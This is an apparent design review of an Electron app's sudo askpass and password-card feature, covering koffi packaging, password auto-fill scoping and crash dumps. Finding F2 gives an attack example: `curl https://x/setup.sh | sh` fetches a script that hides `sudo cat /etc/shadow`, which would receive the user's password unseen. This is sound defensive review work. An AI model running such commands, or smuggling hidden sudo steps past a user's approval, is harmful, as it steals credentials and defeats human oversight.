---
status: active
feature: admin-password
review-round: 3
design: docs/active/specs/2026-09-26-admin-password-technical-design.md
prior-review: docs/active/reviews/2026-09-26-admin-password-design-review-2.md
---

# Admin password card — design review 3

F1 accepted — `node_modules/koffi/**` joins asarUnpack; a packaged-layout test loads koffi from the unpacked helper.  **Blocker.** As specified, `askpass.cjs` cannot load `koffi` in a packaged build — which
also means **E1's accepted fix (review 2, `PR_SET_DUMPABLE`/`ptrace(PT_DENY_ATTACH)` via
koffi) is not actually deployable**, so the highest-severity finding from round 2 ships
unfixed unless this is caught before implementation.

`askpass.cjs` must live outside `app.asar` as a real file — sudo `execve()`s the wrapper
directly and native code can't run from inside an archive, which is exactly why §2.1 relies
on the existing `asarUnpack: scripts/**/*` entry. But `koffi` (`node_modules/koffi`) is
**not** in `asarUnpack`, so it stays packed inside `app.asar`. A bare `require('koffi')`
from a file physically living in `app.asar.unpacked/scripts/askpass/` cannot resolve it:
Node's module resolution walks the *ancestor* directories of the requiring file
(`.../app.asar.unpacked/scripts/askpass` → `.../scripts` → `.../app.asar.unpacked` →
`resources` → …) looking for a `node_modules` folder at each level. `app.asar` is a
**sibling** of `app.asar.unpacked`, not an ancestor, so that walk never reaches
`app.asar/node_modules/koffi` — regardless of Electron's asar-transparency patches, which
only make paths *inside* the archive behave like real files; they don't add the archive
itself as an implicit search root for code running outside it.

Confirmed empirically (not just reasoned): using this repo's own `@electron/asar` and its
own `electron` binary, I packed a stub `koffi` module inside `node_modules/koffi/` of an
`app.asar`, unpacked only `scripts/**` (mirroring the design), and ran the unpacked
`askpass.cjs` under `ELECTRON_RUN_AS_NODE=1`:

```
$ ELECTRON_RUN_AS_NODE=1 electron app.asar.unpacked/scripts/askpass/askpass.cjs
REQUIRE_FAIL Cannot find module 'koffi'
```

An explicit path back into the sibling archive works (`require(path.join(__dirname, '..',
'..', '..', 'app.asar', 'node_modules', 'koffi'))` → `EXPLICIT_PATH_REQUIRE_OK`), confirming
this is exactly the sibling-vs-ancestor resolution gap and not some other breakage.

I then re-tested the fix candidate — adding `node_modules/koffi/**` to `asarUnpack` (using
the *real* `koffi` package, native `.node` binaries included, not the stub) alongside
`scripts/**` — and it works end to end, including loading the native addon:

```
$ asar pack app app.asar --unpack-dir scripts --unpack-dir node_modules/koffi
$ ELECTRON_RUN_AS_NODE=1 electron app.asar.unpacked/scripts/askpass/askpass.cjs
OK
```

(Separately confirmed the *other* half of this — that `koffi` loading its native `.node`
addon from *inside* `app.asar` works fine when the requiring code is itself packed inside
the archive, e.g. `window-exclude-capture.ts`'s existing usage — Electron's `dlopen` patch
does make that case work. The break is specific to code living in `app.asar.unpacked`
reaching back into `app.asar`'s `node_modules`, which is exactly askpass.cjs's situation and
is new to this feature.)

**Fix:** add `node_modules/koffi/**` (or a version-pinned subset covering `index.js`,
`indirect.js`, `package.json`, `lib/**`, and `build/koffi/<platform>/koffi.node`) to
`electron-builder.yml`'s `asarUnpack`, so it lands as a real sibling directory
(`app.asar.unpacked/node_modules/koffi`) reachable by the plain ancestor-walk `require('koffi')`
that `askpass.cjs` needs. Confirm the exec-bit/perm concern separately is NOT an issue here —
I verified `@electron/asar`'s unpack step preserves file mode bits (tested a `chmod 0755`
wrapper through pack/unpack, came out `0755`), so that part of the design's assumption holds
and needs no change.

F2 accepted — the up-front password is handed over only when the connecting sudo's own command line matches the approved command's sudo line; any other sudo in the call gets the mid-command card.  **Blocker.** §2.4's up-front password hand-off is scoped to **the call**, not to **the
specific sudo occurrence the user was shown**. That gap lets the password the user typed for
one displayed command be silently handed to a *different* admin invocation in the same Bash
call that the user never saw named anywhere — with no card at all, not even the mid-command
one (R11) — which is the exact failure R15/R3/R11 exist to prevent, just reached through the
feature's own auto-fill shortcut rather than through §3's forgery checks.

§2.4: "the first verified askpass connection from that call gets it without a card." §2.2
resolves a connecting helper to "which Bash call it belongs to" — a call, not a specific
sudo process within it. Nothing in §2.2–§2.4 requires the connecting sudo's own command text
(which §3.5 already reads, for the mid-command card) to match the text that was shown on the
up-front card before auto-filling.

Concrete scenario, entirely within the threat model §3 already accepts (arbitrary code the
model runs inside one approved Bash call): the approved, admin-floored command is something
like `curl https://x/setup.sh | sh; sudo apt update`. `admin-command.ts` sees the literal
`sudo apt update` and fires the floor; R7's approval card shows the whole command text; §2.4
asks for the password up front for (per its own wording) "the approved command text (sudo
and its options stripped)" — i.e. a card that names `apt update`, not the `curl | sh` part.
The user types their password expecting to authorize `apt update`. But `curl | sh` runs
*first*, and the downloaded script it pipes into `sh` itself contains `sudo cat
/etc/shadow`. That inner sudo is invisible to `admin-command.ts`'s static shell-words floor
(same class of gap E9 already named for `pkexec`-via-`python3 -c`), but it is still a real,
verified sudo descending from the same registered call, so §3 accepts it — and because it is
the *first* askpass connection from that call, §2.4 hands it the buffer silently, no card,
before the user's actual `sudo apt update` ever runs. The user never sees this step named
(breaking R3, "naming the exact step that needs admin rights"), never gets the "type only if
you expected this" warning R11 promises for exactly this kind of script-injected ask, and the
"two separate steps" framing in R2 collapses into one for an action the user didn't approve
in any distinguishable way — even though, per R15's literal wording, the password did go to
"genuine sudo" (the mechanism §3 defends is intact; the mechanism §2.4 adds on top of it is
the actual leak path here).

This doesn't need a forged helper, a race, or anything §3 checks for — it lives entirely in
the gap between "which sudo invocation got shown to the user" and "which sudo invocation
gets the free pass."

**Fix:** don't auto-fill on "first connection from the call" — auto-fill only the specific
sudo invocation whose own argv (read via `/proc/<sudo>/cmdline`, exactly as §3.5 already does
for the mid-command card) textually matches the command the up-front card displayed (sudo and
options stripped, same normalization §2.4 already does to build that text). Any other sudo
connecting from the same call falls through to the ordinary mid-command card path (R11),
which already has the right UI for "a script wants your password, only type it if you
expected this." This preserves the one-round-trip UX for the common single-sudo case R20
exists for, without extending the free pass to sudo invocations the user was never shown.

F3 rejected — Electron minidumps capture thread stacks and small memory regions, not the renderer heap, and upload is off; this applies to every password field in the app today and is not specific to this feature.  **Minor.** A renderer crash while the password field is being typed (before submit) can
leave the plaintext in a local minidump on disk, which is a form of "saved" even though it
never leaves the machine. `crash-diagnostics.ts` starts `crashReporter.start({ uploadToServer:
false, ignoreSystemCrashHandler: false })` before `app.whenReady()`, covering `render-process-gone`
in production; a renderer crash captures a minidump of the renderer process's memory,
written to `app.getPath('crashDumps')`. `AdminPasswordPrompt` clears its state on submit (per
§2.6, "done"), but says nothing about the window before submit, where the typed password sits
in React state as plain text for as long as the user is typing. This is a pre-existing
property of the crash reporter for any sensitive renderer field, not unique to this feature,
and the dump genuinely never leaves the machine (no `submitURL`) — so it doesn't contradict
R6/R15 — but it is in tension with R13's plain-language "never saved," which a user reading
that promise would reasonably expect to cover a password sitting in an on-disk crash dump
too. Not blocking; worth a one-line decision on the deck (accept as a stated exception to
"never saved," or have `AdminPasswordPrompt` hold the in-progress value outside a path a
minidump would usefully capture — e.g. it's already going into a Buffer in main on submit,
so there's little to gain from also holding it in long-lived renderer state before then).
